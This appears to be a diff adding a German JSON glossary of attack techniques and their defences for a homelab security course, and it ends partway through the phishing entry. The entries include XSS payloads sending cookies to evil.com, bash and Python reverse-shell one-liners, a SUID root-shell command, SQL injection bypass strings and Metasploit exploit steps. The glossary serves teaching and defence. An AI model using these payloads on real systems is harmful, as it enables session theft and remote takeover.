@@ -1,0 +1,367 @@
+{
+  "meta": {
+    "version": "1.0",
+    "updated": "2026-04-19",
+    "category": "Hacking & Angriffe",
+    "description": "Angriffstechniken, Exploit-Methoden, Hacking-Tools und Verteidigungsstrategien — von Reconnaissance bis Post-Exploitation"
+  },
+  "entries": [
+    {
+      "id": "kill-chain",
+      "term": "Cyber Kill Chain (Lockheed Martin)",
+      "tags": ["Hacking", "Grundlagen", "Framework"],
+      "summary": "7-stufiges Modell das den Ablauf eines Cyberangriffs beschreibt — von der Aufklärung bis zur Zielerreichung. Jede Stufe ist eine Chance den Angriff zu stoppen.",
+      "explanation": "Die Cyber Kill Chain beschreibt wie ein Angriff typischerweise abläuft:\n\n1. Reconnaissance: Informationen über das Ziel sammeln (OSINT, Port Scanning, Social Engineering)\n2. Weaponization: Exploit + Payload bauen (z.B. Malware in PDF einbetten)\n3. Delivery: Waffe zum Ziel bringen (Phishing-Mail, USB-Stick, Drive-by Download)\n4. Exploitation: Schwachstelle ausnutzen (Buffer Overflow, SQL Injection, Zero-Day)\n5. Installation: Persistenz etablieren (Backdoor, Rootkit, Scheduled Task)\n6. Command & Control (C2): Kommunikationskanal zum Angreifer aufbauen\n7. Actions on Objectives: eigentliches Ziel erreichen (Daten stehlen, verschlüsseln, zerstören)\n\nVerteidigung: je früher in der Kill Chain man den Angriff erkennt, desto besser. IDS erkennt bei Schritt 1-3, Firewall blockt bei 3-4, EDR bei 5-6, DLP bei 7.",
+      "howItWorks": "Beispiel-Angriff gegen ein Homelab:\n1. Recon: Angreifer scannt deine öffentliche IP → findet Port 8006 (Proxmox)\n2. Weaponization: Sucht CVE für Proxmox VE 9.1.7\n3. Delivery: Exploit direkt über Port 8006\n4. Exploitation: Schwachstelle in Web-UI ausgenutzt\n5. Installation: Reverse Shell, SSH-Key in authorized_keys\n6. C2: Angreifer hat permanenten SSH-Zugang\n7. Action: Crypto-Miner installiert, Daten exfiltriert\n\nDein Schutz: Port 8006 NICHT ans Internet (VPN!), Patches, IDS, Monitoring.",
+      "homelab": "Dein Homelab ist (noch) nicht aus dem Internet erreichbar — das ist der beste Schutz. Wenn WireGuard VPN kommt (p2-wireguard): nur UDP 51820 exponieren, alles andere hinter dem VPN. Kein Proxmox Web-UI direkt ans Internet!",
+      "security": "Die Kill Chain ist ein Denk-Framework, kein strikter Ablauf. Moderne Angreifer überspringen Schritte oder gehen non-linear vor. MITRE ATT&CK ist das detailliertere Framework.",
+      "relatedTerms": ["mitre-attack", "reconnaissance", "lateral-movement", "defense-in-depth"],
+      "links": [
+        { "title": "Lockheed Martin Kill Chain", "url": "https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html" }
+      ]
+    },
+    {
+      "id": "mitre-attack",
+      "term": "MITRE ATT&CK Framework",
+      "tags": ["Hacking", "Framework", "Defense"],
+      "summary": "Umfassende Wissensdatenbank mit realen Angriffstechniken, kategorisiert nach Taktiken (WAS will der Angreifer) und Techniken (WIE macht er es).",
+      "explanation": "MITRE ATT&CK ist der Industriestandard für die Beschreibung von Angriffen. Kategorien:\n\n• Taktiken (das WAS — Spalten in der Matrix):\n  Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Exfiltration, Impact\n\n• Techniken (das WIE — Zellen in der Matrix):\n  Jede Taktik hat dutzende Techniken. Z.B. unter 'Initial Access': Phishing (T1566), Drive-by Compromise (T1189), Valid Accounts (T1078)\n\n• Sub-Techniken: noch feiner. Phishing → Spearphishing Attachment (T1566.001), Spearphishing Link (T1566.002)\n\nJede Technik hat: Beschreibung, Beispiele aus echten Angriffen (APT-Gruppen), Detection-Möglichkeiten, Mitigations.",
+      "howItWorks": "Anwendung im Homelab:\n1. ATT&CK Navigator öffnen (attack.mitre.org)\n2. Eigene Infrastruktur durchgehen: welche Techniken sind relevant?\n3. Für jede relevante Technik: habe ich Detection? Habe ich Mitigation?\n4. Lücken identifizieren und priorisieren\n\nBeispiel: T1110 Brute Force → Detection: auth.log monitoren, Fail2Ban → Mitigation: SSH Key-Auth, kein Passwort-Login",
+      "homelab": "ATT&CK als Checkliste für dein Homelab-Hardening nutzen. Phase 4 (Security Lab) nutzt ATT&CK Techniken zum Üben: Kali Linux Tools mappen auf ATT&CK Techniken.",
+      "security": "ATT&CK ist sowohl für Angreifer (Red Team) als auch für Verteidiger (Blue Team) nützlich. Purple Teaming: beide Seiten nutzen ATT&CK als gemeinsame Sprache.",
+      "relatedTerms": ["kill-chain", "reconnaissance", "privilege-escalation", "lateral-movement"],
+      "links": [
+        { "title": "MITRE ATT&CK", "url": "https://attack.mitre.org/" },
+        { "title": "ATT&CK Navigator", "url": "https://mitre-attack.github.io/attack-navigator/" }
+      ]
+    },
+    {
+      "id": "reconnaissance",
+      "term": "Reconnaissance (Aufklärung)",
+      "tags": ["Hacking", "Kill Chain", "OSINT"],
+      "summary": "Erste Phase eines Angriffs: Informationen über das Ziel sammeln. Passiv (OSINT, ohne Kontakt) oder aktiv (Port Scanning, Probing).",
+      "explanation": "• Passive Reconnaissance (OSINT):\n  - Whois-Abfrage: wem gehört die Domain/IP?\n  - DNS-Records: welche Subdomains, Mail-Server, Nameserver?\n  - Shodan/Censys: welche Services sind im Internet sichtbar?\n  - Social Media: Mitarbeiter-Infos, Technologie-Stack, Job-Ausschreibungen\n  - GitHub: Code-Repos durchsuchen nach Credentials, API-Keys\n  - Google Dorks: site:example.com filetype:pdf, inurl:admin\n\n• Active Reconnaissance:\n  - Port Scanning (nmap): welche Ports sind offen?\n  - Service Detection: welche Software läuft auf den Ports? Welche Version?\n  - OS Fingerprinting: welches Betriebssystem? (TTL-Analyse, TCP-Stack-Verhalten)\n  - Vulnerability Scanning: automatisch nach bekannten CVEs suchen\n  - Banner Grabbing: Server-Header lesen (Apache 2.4.51, OpenSSH 8.9)",
+      "howItWorks": "Recon gegen dein Homelab (wenn es am Internet hinge):\n1. nmap -sS -sV -O 84.123.x.x → offene Ports, Services, OS\n2. Ergebnis: Port 51820/UDP (WireGuard), sonst nichts\n3. Angreifer weiß: hier läuft ein VPN, kein direkter Zugang zu Diensten\n4. Nächster Versuch: WireGuard-Schwachstellen suchen (gibt keine bekannten)\n5. Angriff gestoppt bei Phase 1 → Minimale Angriffsfläche = gutes Design",
+      "homelab": "Selbst Recon gegen das eigene Netz machen: nmap -sS 192.168.0.0/24 vom Jumphost. Was ist von außen sichtbar? Was von innen? Shodan.io prüfen ob deine öffentliche IP gelistet ist.",
+      "security": "Minimale Angriffsfläche = beste Verteidigung gegen Recon. Keine unnötigen Ports offen. Server-Banner unterdrücken (ServerTokens Off). DNS Zone Transfers blockieren (AXFR nur für autorisierte Server).",
+      "relatedTerms": ["port-scanning", "kill-chain", "mitre-attack"],
+      "links": [
+        { "title": "Shodan", "url": "https://www.shodan.io/" },
+        { "title": "OSINT Framework", "url": "https://osintframework.com/" }
+      ]
+    },
+    {
+      "id": "port-scanning",
+      "term": "Port Scanning (nmap)",
+      "tags": ["Hacking", "Reconnaissance", "Tools"],
+      "summary": "Systematisch Ports auf einem Zielhost prüfen um offene Dienste zu finden. nmap ist das Standard-Tool.",
+      "explanation": "Scan-Typen:\n\n• SYN Scan (-sS, 'Stealth Scan'): sendet SYN, wartet auf SYN-ACK (offen) oder RST (geschlossen). Baut die Verbindung NICHT fertig auf → weniger Logs auf dem Ziel.\n\n• Connect Scan (-sT): vollständiger TCP Handshake. Langsamer, aber braucht keine Root-Rechte.\n\n• UDP Scan (-sU): sendet UDP-Pakete, wartet auf ICMP Port Unreachable (geschlossen) oder Antwort (offen). Langsam weil Timeout-basiert.\n\n• XMAS Scan (-sX): setzt FIN+PSH+URG Flags. Geschlossene Ports antworten mit RST, offene ignorieren es. Erkennt manche Firewalls nicht.\n\n• NULL Scan (-sN): keine Flags gesetzt. Ähnlich wie XMAS.\n\n• Version Detection (-sV): identifiziert Software und Version auf offenen Ports.\n\n• OS Detection (-O): errät das Betriebssystem anhand von TCP/IP Stack-Eigenheiten.",
+      "howItWorks": "Homelab scannen:\nnmap -sS -sV -O 192.168.0.200\n\nErgebnis:\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 9.6p1 Debian 4\n8006/tcp open  http     Proxmox VE Web UI\nOS: Linux 6.x (Debian)\n\n→ Zwei offene Ports. Angreifer weiß: SSH + Proxmox Web-UI.\n→ Fix: SSH nur von Jumphost erlauben (Firewall-Regel), Web-UI hinter Reverse Proxy.",
+      "homelab": "Auf dem Jumphost: nmap installiert (apt install nmap). Regelmäßig eigene Infrastruktur scannen: nmap -sS 192.168.0.0/24 — was ist offen was nicht sein sollte? In Phase 4: nmap von Kali im Lab-VLAN gegen eigene Dienste.",
+      "security": "Port Scanning ohne Erlaubnis ist in vielen Ländern illegal. Nur eigene Systeme scannen oder schriftliche Genehmigung haben. Firewalls loggen Port Scans — ein IDS (Suricata) erkennt Scan-Patterns und alarmiert.",
+      "relatedTerms": ["reconnaissance", "kill-chain", "firewall-typen"],
+      "links": [
+        { "title": "nmap Docs", "url": "https://nmap.org/book/man.html" },
+        { "title": "nmap Cheat Sheet", "url": "https://www.stationx.net/nmap-cheat-sheet/" }
+      ]
+    },
+    {
+      "id": "sql-injection",
+      "term": "SQL Injection (SQLi)",
+      "tags": ["Hacking", "Web", "OWASP"],
+      "summary": "Angreifer injiziert SQL-Befehle über Eingabefelder in die Datenbank-Query. Kann Daten lesen, ändern, löschen oder das ganze System übernehmen.",
+      "explanation": "Verwundbarer Code (PHP/Python):\nquery = \"SELECT * FROM users WHERE name='\" + username + \"' AND pass='\" + password + \"'\"\n\nAngreifer gibt ein:\nUsername: admin' OR '1'='1' --\nPassword: (egal)\n\nResultierende Query:\nSELECT * FROM users WHERE name='admin' OR '1'='1' --' AND pass='...'\n\n'1'='1' ist immer wahr → alle Users werden returned → Login als Admin ohne Passwort.\n\nSchwere SQLi-Varianten:\n• UNION-based: SELECT ... UNION SELECT password FROM users → Daten aus anderen Tabellen lesen\n• Blind SQLi: kein direkter Output, aber über Timing oder True/False-Antworten Daten extrahieren\n• Error-based: Datenbank-Fehlermeldungen verraten Struktur und Daten\n• Second-order: Injection wird gespeichert und später in anderem Kontext ausgeführt",
+      "howItWorks": "Angriff gegen ein verwundbares Login:\n1. Angreifer findet Login-Formular\n2. Testet: ' OR '1'='1 im Username-Feld\n3. Wenn Login erfolgreich → SQLi vorhanden\n4. sqlmap -u 'http://target/login' --data='user=admin&pass=test' → automatisiert\n5. sqlmap extrahiert alle Tabellen, User, Passwort-Hashes\n\nFix (Prepared Statements):\nquery = \"SELECT * FROM users WHERE name=? AND pass=?\"\ncursor.execute(query, (username, password))\n→ User-Input wird NIEMALS als SQL interpretiert, nur als Daten.",
+      "homelab": "Proxmox Web-UI ist nicht anfällig (nutzt Perl mit parametrisierten Queries). Aber selbst-gehostete Web-Apps (DokuWiki, n8n, Gitea) könnten verwundbar sein → immer aktuell halten. DVWA im Lab-VLAN zum Üben (p4-pentest).",
+      "security": "OWASP #1 Schwachstelle (jahrelang). Fix: IMMER Prepared Statements/Parametrized Queries. NIEMALS String-Concatenation für SQL. WAF (ModSecurity) als zusätzliche Schicht. Input Validation (Whitelist, nicht Blacklist).",
+      "relatedTerms": ["xss", "owasp-top10", "waf"],
+      "links": [
+        { "title": "OWASP SQL Injection", "url": "https://owasp.org/www-community/attacks/SQL_Injection" },
+        { "title": "sqlmap", "url": "https://sqlmap.org/" }
+      ]
+    },
+    {
+      "id": "xss",
+      "term": "XSS (Cross-Site Scripting)",
+      "tags": ["Hacking", "Web", "OWASP"],
+      "summary": "Angreifer injiziert JavaScript-Code in eine Webseite. Wenn andere User die Seite besuchen, wird der Code in ihrem Browser ausgeführt — Cookies stehlen, Sessions hijacken.",
+      "explanation": "Drei Typen:\n\n• Reflected XSS: Schadcode ist in der URL. Opfer klickt präparierten Link → Server reflektiert den Code in der Antwort → Browser führt ihn aus.\n  URL: https://site.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>\n\n• Stored XSS: Schadcode wird gespeichert (Kommentar, Profil, Forum). JEDER User der die Seite besucht führt den Code aus. Gefährlicher weil persistent.\n  Kommentar: Tolles Produkt! <script>fetch('http://evil.com/steal?c='+document.cookie)</script>\n\n• DOM-based XSS: Schadcode wird nur client-seitig verarbeitet (JavaScript manipuliert DOM basierend auf URL-Fragmenten). Server sieht den Angriff nie.",
+      "howItWorks": "Stored XSS in einem Gästebuch:\n1. Angreifer postet Kommentar: <script>fetch('https://evil.com/log?cookie='+document.cookie)</script>\n2. Kommentar wird in der Datenbank gespeichert\n3. Admin öffnet die Gästebuch-Seite\n4. Browser rendert den Kommentar → Script wird ausgeführt\n5. Admin's Session-Cookie wird an evil.com gesendet\n6. Angreifer nutzt den Cookie → ist als Admin eingeloggt\n\nFix:\n• Output Encoding: < wird zu &lt;, > zu &gt; → Browser interpretiert es als Text, nicht als Code\n• Content Security Policy (CSP): Header der inline Scripts verbietet\n• HttpOnly Cookies: JavaScript kann den Cookie nicht lesen (document.cookie gibt nichts zurück)",
+      "homelab": "Self-hosted Web-Apps (DokuWiki, Gitea, n8n) könnten XSS-Schwachstellen haben → Updates sind kritisch. CSP-Header am Reverse Proxy setzen. HttpOnly + Secure + SameSite Flags auf allen Cookies.",
+      "security": "XSS ist OWASP #3 (2021). Kombination aus Input Validation (was darf rein?) + Output Encoding (was kommt raus?) + CSP (was darf der Browser ausführen?). DVWA hat XSS-Übungen in verschiedenen Schwierigkeitsgraden.",
+      "relatedTerms": ["sql-injection", "owasp-top10", "csrf"],
+      "links": [
+        { "title": "OWASP XSS Prevention", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" }
+      ]
+    },
+    {
+      "id": "csrf",
+      "term": "CSRF (Cross-Site Request Forgery)",
+      "tags": ["Hacking", "Web", "OWASP"],
+      "summary": "Angreifer bringt das Opfer dazu eine ungewollte Aktion auf einer Seite auszuführen auf der es eingeloggt ist — ohne dass es davon weiß.",
+      "explanation": "Szenario:\n1. Admin ist in Proxmox Web-UI eingeloggt (Session-Cookie im Browser)\n2. Admin besucht eine bösartige Webseite (Phishing-Link)\n3. Bösartige Seite enthält: <img src='https://proxmox:8006/api2/json/nodes/pve/qemu/101/status/stop' />\n4. Browser sendet den Request MIT dem Proxmox-Cookie (automatisch!)\n5. Proxmox stoppt VM 101 — der Admin hat das nicht gewollt\n\nWarum funktioniert das? Der Browser sendet Cookies automatisch mit jedem Request an die Domain — egal von welcher Seite der Request kommt.\n\nFix:\n• CSRF-Token: Server generiert zufälliges Token pro Session/Formular. Request ohne gültiges Token wird abgelehnt. Angreifer kennt das Token nicht.\n• SameSite Cookie: Cookie wird nicht mit Cross-Site Requests gesendet.\n• Proxmox nutzt CSRFPreventionToken — deshalb funktioniert der Angriff oben in der Praxis nicht.",
+      "howItWorks": "Proxmox schützt sich:\n1. Login → Server sendet CSRFPreventionToken als Cookie + Header\n2. Jeder API-Request muss den CSRFPreventionToken als HTTP-Header mitschicken\n3. Der Angreifer kann das Token nicht lesen (Same-Origin Policy)\n4. Request ohne Token → 401 Unauthorized\n\nDu hast das gesehen: curl -H 'CSRFPreventionToken: ...' bei der Proxmox API.",
+      "homelab": "Proxmox ist geschützt (CSRF-Token). Andere Self-hosted Apps prüfen: haben sie CSRF-Schutz? Gitea, n8n, DokuWiki — alle modernen Frameworks haben es eingebaut.",
+      "security": "CSRF + XSS zusammen = besonders gefährlich: XSS kann das CSRF-Token aus der Seite lesen und damit beliebige Aktionen ausführen. Deshalb: XSS-Schutz ist die Basis für CSRF-Schutz.",
+      "relatedTerms": ["xss", "owasp-top10", "session-hijacking"],
+      "links": [
+        { "title": "OWASP CSRF Prevention", "url": "https://owasp.org/www-community/attacks/csrf" }
+      ]
+    },
+    {
+      "id": "owasp-top10",
+      "term": "OWASP Top 10",
+      "tags": ["Hacking", "Web", "Framework"],
+      "summary": "Die 10 kritischsten Sicherheitsrisiken für Webanwendungen. Industriestandard, wird alle 3-4 Jahre aktualisiert.",
+      "explanation": "OWASP Top 10 (2021):\n\n1. A01 Broken Access Control: User können Dinge tun die sie nicht dürfen (anderer User's Profil bearbeiten, Admin-Seiten ohne Auth)\n2. A02 Cryptographic Failures: schwache Verschlüsselung, Klartext-Passwörter, veraltete Algorithmen\n3. A03 Injection: SQL Injection, Command Injection, LDAP Injection\n4. A04 Insecure Design: grundlegende Design-Fehler (Security nicht eingeplant)\n5. A05 Security Misconfiguration: Default-Passwörter, unnötige Features aktiv, Stack Traces exposed\n6. A06 Vulnerable Components: veraltete Libraries mit bekannten CVEs\n7. A07 Auth Failures: schwache Passwörter, fehlende MFA, Session-Fixation\n8. A08 Software & Data Integrity: unsichere CI/CD, keine Code-Signierung\n9. A09 Logging & Monitoring Failures: Angriffe werden nicht erkannt\n10. A10 SSRF (Server-Side Request Forgery): Server wird als Proxy missbraucht",
+      "howItWorks": "Homelab-Selbstcheck gegen OWASP Top 10:\n• A01: Proxmox RBAC konfiguriert? Können nicht-Admin User VMs löschen?\n• A02: Passwörter als bcrypt gespeichert (nicht MD5)? TLS überall?\n• A03: Self-hosted Apps mit Prepared Statements?\n• A05: Default-Passwörter geändert? No-Subscription Popup = Misconfiguration Hinweis\n• A06: Alle Pakete aktuell? apt upgrade regelmäßig?\n• A07: SSH Key-Auth statt Passwort? MFA auf Proxmox?\n• A09: Logging aktiv? Werden auth.log Einträge überwacht?",
+      "homelab": "OWASP Top 10 als Checkliste für jede neue Web-App die du deployst. Bevor ein Dienst online geht: die 10 Punkte durchgehen. DVWA im Lab-VLAN deckt mehrere OWASP-Kategorien ab.",
+      "security": "OWASP ist nicht nur eine Liste — es gibt zu jedem Punkt Testing Guides, Prevention Cheatsheets und Code-Beispiele. owasp.org ist die wichtigste Ressource für Web-Security.",
+      "relatedTerms": ["sql-injection", "xss", "csrf", "waf"],
+      "links": [
+        { "title": "OWASP Top 10 (2021)", "url": "https://owasp.org/www-project-top-ten/" },
+        { "title": "OWASP Cheat Sheet Series", "url": "https://cheatsheetseries.owasp.org/" }
+      ]
+    },
+    {
+      "id": "privilege-escalation",
+      "term": "Privilege Escalation (Rechteausweitung)",
+      "tags": ["Hacking", "Post-Exploitation"],
+      "summary": "Von einem niedrig-privilegierten Account (www-data, noob) zu höheren Rechten (root, SYSTEM) gelangen. Vertikal (User→Root) oder horizontal (User A→User B).",
+      "explanation": "• Vertikale Privilege Escalation: normaler User → root/admin\n  - SUID-Binaries: find / -perm -4000 → Programme die als Root laufen\n  - sudo Misconfigurations: sudo -l → was darf der User ohne Passwort?\n  - Kernel Exploits: alter Kernel mit bekannter CVE (Dirty Cow, Dirty Pipe)\n  - Writable /etc/passwd oder /etc/shadow: eigenen Root-User hinzufügen\n  - Docker Socket: wenn /var/run/docker.sock für den User lesbar → Root in Sekunden\n  - Cronjobs: wenn ein Cronjob ein editierbares Script als Root ausführt\n\n• Horizontale Privilege Escalation: User A → User B (gleiche Berechtigung, andere Identität)\n  - Session-Token stehlen\n  - Passwort-Reuse: User A hat gleiches Passwort wie User B\n  - IDOR (Insecure Direct Object Reference): /profile?id=1 → /profile?id=2",
+      "howItWorks": "Linux PrivEsc Checkliste:\n1. whoami, id → wer bin ich, in welchen Gruppen?\n2. sudo -l → was darf ich mit sudo?\n3. find / -perm -4000 2>/dev/null → SUID-Binaries\n4. cat /etc/crontab → Cronjobs die als Root laufen\n5. ls -la /var/run/docker.sock → Docker Socket zugänglich?\n6. uname -a → Kernel-Version, bekannte Exploits?\n7. find / -writable -type f 2>/dev/null → beschreibbare Dateien\n\nBeispiel SUID-Exploit:\n$ find / -perm -4000 → /usr/bin/python3 hat SUID\n$ python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n# whoami → root",
+      "homelab": "Auf dem Jumphost (noob-User): sudo -l prüfen. noob ist in der sudo-Gruppe → kann alles. Für mehr Sicherheit: sudo auf bestimmte Befehle einschränken. In Phase 4: PrivEsc auf Metasploitable üben.",
+      "security": "Least Privilege ist die Hauptverteidigung. Keine unnötigen SUID-Binaries. Docker-Gruppe = Root-Äquivalent. Kernel aktuell halten (Dirty Pipe war 2022). Tools: LinPEAS, LinEnum für automatische PrivEsc-Checks.",
+      "relatedTerms": ["lateral-movement", "kill-chain", "reverse-shell"],
+      "links": [
+        { "title": "GTFOBins (SUID/sudo Exploits)", "url": "https://gtfobins.github.io/" },
+        { "title": "LinPEAS", "url": "https://github.com/carlospolop/PEASS-ng" }
+      ]
+    },
+    {
+      "id": "lateral-movement",
+      "term": "Lateral Movement (Seitliche Bewegung)",
+      "tags": ["Hacking", "Post-Exploitation"],
+      "summary": "Nach dem initialen Einbruch sich im Netzwerk von System zu System bewegen um weitere Ziele zu erreichen. Der Angreifer 'springt' zwischen Hosts.",
+      "explanation": "Wenn ein Angreifer einen Host kompromittiert hat, will er sich weiter ausbreiten:\n\n• SSH Key Reuse: gestohlener Private Key funktioniert auf anderen Hosts\n• Credential Dumping: Passwörter/Hashes aus dem Speicher extrahieren (Mimikatz auf Windows)\n• Pass-the-Hash: NTLM-Hash statt Passwort für Auth verwenden (Windows)\n• SMB/WMI: Remote Command Execution über Windows-Dienste\n• SSH Pivoting: kompromittierten Host als Sprungbrett (ssh -J) für weitere Hosts\n• Exploiting Trust: wenn Host A Host B vertraut (authorized_keys, NFS, etc.)\n\nGenau hier helfen VLANs: wenn der Angreifer im Lab-VLAN ist, kann er nicht nach MGMT springen — die Firewall blockt den Traffic.",
+      "howItWorks": "Szenario in deinem Homelab (ohne VLANs):\n1. Angreifer kompromittiert AdGuard Container (192.168.0.201)\n2. Von dort: ssh root@192.168.0.200 → Proxmox (wenn gleicher SSH-Key)\n3. Von Proxmox: Zugriff auf alle VMs und Container\n4. Alles im gleichen /24 → kein Hindernis\n\nMit VLANs + Firewall:\n1. Angreifer kompromittiert Lab-VM (10.0.3.x)\n2. Versucht: ssh 10.0.1.2 → GEBLOCKT (LAB→MGMT verboten)\n3. Versucht: nmap 10.0.1.0/24 → GEBLOCKT\n4. Angreifer ist isoliert im Lab-VLAN → Schaden begrenzt",
+      "homelab": "VLANs (p2-vlans) und Firewall (p2-firewall) sind die Hauptverteidigung gegen Lateral Movement. Unterschiedliche SSH-Keys pro Segment. Jumphost als einziger Zugang zu MGMT. Monitoring: ungewöhnliche Verbindungen zwischen VLANs erkennen.",
+      "security": "Network Segmentation ist die #1 Verteidigung. Micro-Segmentation (Zero Trust): jeder Host ist ein eigenes Segment. Credential-Rotation: wenn ein Key kompromittiert wird, nicht alle Hosts betroffen.",
+      "relatedTerms": ["privilege-escalation", "kill-chain", "vlan-konzept", "zero-trust"],
+      "links": []
+    },
+    {
+      "id": "reverse-shell",
+      "term": "Reverse Shell",
+      "tags": ["Hacking", "Post-Exploitation", "Tools"],
+      "summary": "Das Ziel verbindet sich ZURÜCK zum Angreifer statt umgekehrt. Umgeht Firewalls die eingehende Verbindungen blocken aber ausgehende erlauben.",
+      "explanation": "Normaler Zugriff: Angreifer → Ziel (eingehende Verbindung, wird von Firewall geblockt)\nReverse Shell: Ziel → Angreifer (ausgehende Verbindung, Firewalls erlauben oft ausgehend)\n\nDer Angreifer startet einen Listener auf seiner Maschine:\n  nc -lvp 4444   (Netcat wartet auf Port 4444)\n\nDas Ziel führt einen Befehl aus der sich zurückverbindet:\n  bash -i >& /dev/tcp/10.0.3.50/4444 0>&1\n\nErgebnis: Angreifer hat eine interaktive Shell auf dem Ziel.\n\nVarianten:\n• Bash Reverse Shell (oben)\n• Python: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.3.50\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n• PowerShell (Windows): ähnliches Konzept\n• Meterpreter (Metasploit): fortgeschrittene Reverse Shell mit File Upload, Keylogger, Screengrab",
+      "howItWorks": "Lab-Übung:\n1. Kali (10.0.3.21): nc -lvp 4444 → Listener starten\n2. Metasploitable (10.0.3.22): Exploit ausführen der Reverse Shell triggert\n3. Kali bekommt Shell-Zugang auf Metasploitable\n4. whoami → www-data → Privilege Escalation → root\n\nDetektion:\n• IDS (Suricata): erkennt Reverse Shell Patterns im Traffic\n• Firewall: ausgehende Verbindungen auf ungewöhnliche Ports blocken\n• Monitoring: Prozesse die /dev/tcp verwenden → verdächtig",
+      "homelab": "NUR im Lab-VLAN üben (10.0.3.0/24). Reverse Shells gegen Metasploitable/DVWA sind die Standard-Übung in Pentesting-Kursen. Firewall-Regel: Lab darf NICHT ins Internet → verhindert echte Reverse Shells nach außen.",
+      "security": "Egress Filtering: nicht alles darf raus. Ausgehende Verbindungen auf bekannte Ports/Dienste beschränken. IDS erkennt Shell-Patterns. Host-basierte Firewall (iptables) auf jedem Server.",
+      "relatedTerms": ["privilege-escalation", "lateral-movement", "metasploit"],
+      "links": [
+        { "title": "Reverse Shell Cheat Sheet", "url": "https://www.revshells.com/" }
+      ]
+    },
+    {
+      "id": "metasploit",
+      "term": "Metasploit Framework",
+      "tags": ["Hacking", "Tools", "Pentesting"],
+      "summary": "Das bekannteste Penetration-Testing-Framework. Enthält Exploits, Payloads, Scanner und Post-Exploitation Module. Standard-Tool auf Kali Linux.",
+      "explanation": "Metasploit-Komponenten:\n\n• Exploits: Code der eine Schwachstelle ausnutzt (Buffer Overflow, SQL Injection, etc.)\n• Payloads: Code der nach dem Exploit ausgeführt wird (Reverse Shell, Meterpreter, Command)\n• Auxiliary: Scanner, Fuzzer, DoS-Module\n• Post: Post-Exploitation Module (Credential Dumping, Keylogger, Pivoting)\n• Encoders: Payload verschleiern um Antivirus zu umgehen\n\nMeterpreter: Metasploits fortgeschrittene Payload. Läuft im RAM (kein File auf Disk), hat eingebaute Befehle: upload, download, screenshot, keyscan, hashdump, portfwd, route.\n\nAblauf:\n1. msfconsole → Metasploit starten\n2. search exploit/http → Exploits suchen\n3. use exploit/multi/http/apache_struts → Exploit auswählen\n4. set RHOSTS 10.0.3.22 → Ziel setzen\n5. set PAYLOAD linux/x64/meterpreter/reverse_tcp → Payload wählen\n6. exploit → ausführen",
+      "howItWorks": "Lab-Übung gegen Metasploitable:\n1. Kali: msfconsole\n2. use exploit/unix/ftp/vsftpd_234_backdoor\n3. set RHOSTS 10.0.3.22\n4. exploit\n5. Shell erhalten → whoami → root\n6. Jetzt: Post-Exploitation üben (Persistence, Credential Dumping)\n\nBEACHTEN: Metasploitable ist ABSICHTLICH verwundbar. Echte Systeme ohne Erlaubnis angreifen = Straftat.",
+      "homelab": "Metasploit auf Kali Linux (10.0.3.21) im Lab-VLAN. Ziele: Metasploitable (10.0.3.22), DVWA. NIEMALS gegen MGMT/SVC Systeme ohne expliziten Plan und Snapshot. Lab-VLAN ist isoliert → kein Risiko für Produktiv-Dienste.",
+      "security": "Metasploit ist ein Werkzeug — es kann für legitimes Pentesting UND für Angriffe verwendet werden. Ethik: nur mit Erlaubnis verwenden. Armitage ist die GUI für Metasploit (einfacher für Anfänger).",
+      "relatedTerms": ["reverse-shell", "privilege-escalation", "port-scanning", "reconnaissance"],
+      "links": [
+        { "title": "Metasploit Docs", "url": "https://docs.metasploit.com/" },
+        { "title": "Metasploitable 3", "url": "https://github.com/rapid7/metasploitable3" }
+      ]
+    },
+    {
+      "id": "phishing",
+      "term": "Phishing (E-Mail, Spear, Vishing, Smishing)",
+      "tags": ["Hacking", "Social Engineering"],
+      "summary": "Angreifer täuscht eine vertrauenswürdige Identität vor um Credentials, Daten oder Malware-Installation zu ergaunern. Häufigster Angriffsvektor.",
+      "explanation": "Varianten:\n\n• Phishing (Mass): generische E-Mails an tausende Empfänger. 'Ihr PayPal-Konto wurde gesperrt → hier klicken'. Niedrige Erfolgsrate, großes Volumen.\n\n• Spear Phishing: gezielter Angriff auf eine Person/Firma. Personalisiert, recherchiert. 'Hallo Max, anbei die Rechnung von letzter Woche [malware.pdf]'. Hohe Erfolgsrate.\n\n• Whaling: Spear Phishing gegen C-Level (CEO, CFO). 'CEO an Buchhalter: Bitte 50.000€ an dieses Konto überweisen.'\n\n• Vishing: Voice Phishing per Telefon. 'Hier ist Microsoft Support, wir haben einen Virus auf Ihrem PC gefunden.'\n\n• Smishing: SMS Phishing. 'Ihr Paket konnte nicht zugestellt werden → tracking-link.evil.com'\n\nErkennungsmerkmale:\n• Dringlichkeit ('SOFORT handeln!')\n• Generische Anrede ('Sehr geehrter Kunde')\n• Falsche Domain (paypa1.com statt paypal.com)\n• Unerwartete Anhänge (.zip, .exe, .docm)\n• Hover über Link: zeigt andere URL als angezeigt",
+      "howItWorks": "Spear Phishing gegen einen Homelab-Admin:\n1. Angreifer findet GitHub Repo (kaynethy/homelab)\n2. Sieht: Proxmox, AdGuard, Debian — kennt den Tech-Stack\n3. Schickt E-Mail: 'Proxmox Security Advisory: Critical CVE, update NOW → [link]'\n4. Link führt zu Fake-Proxmox-Login → Credentials gestohlen\n5. Angreifer loggt sich ein → komplett kompromittiert\n\nSchutz:\n• GitHub Repo: keine IPs, Passwörter, Keys committen\n• MFA auf allen Logins (Proxmox, E-Mail)\n• Phishing-Awareness: immer URL prüfen",
+      "homelab": "Dein GitHub Repo ist öffentlich — ein Angreifer kann daraus deinen Tech-Stack lernen. Stelle sicher: keine Credentials, IPs oder Keys im Repo. .gitignore für .secrets/, *.ppk, .env.",
+      "security": "90% aller Cyberangriffe beginnen mit Phishing. Technische Maßnahmen: SPF/DKIM/DMARC (Mail-Auth), URL-Filtering (AdGuard Blocklists), MFA (selbst mit gestohlenen Credentials kein Login). Menschliche Maßnahme: Awareness-Training.",
